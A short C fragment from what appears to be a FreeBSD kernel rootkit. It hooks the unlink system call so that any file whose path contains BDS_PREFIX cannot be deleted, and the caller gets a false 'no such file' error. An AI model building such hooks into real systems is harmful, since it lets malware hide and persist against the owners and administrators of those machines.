static int bds_unlink(struct thread *td, struct unlink_args *uap) {
	char path[256];
	
	int error = copyinstr(uap->path, path, 256, NULL);
	if (error != 0) {
		return error;
	}	
	if (strstr(path, BDS_PREFIX)) {
		//printf("\nunlink blocked\n");
		return ENOENT;		
	}

	return sys_unlink(td, uap);
}
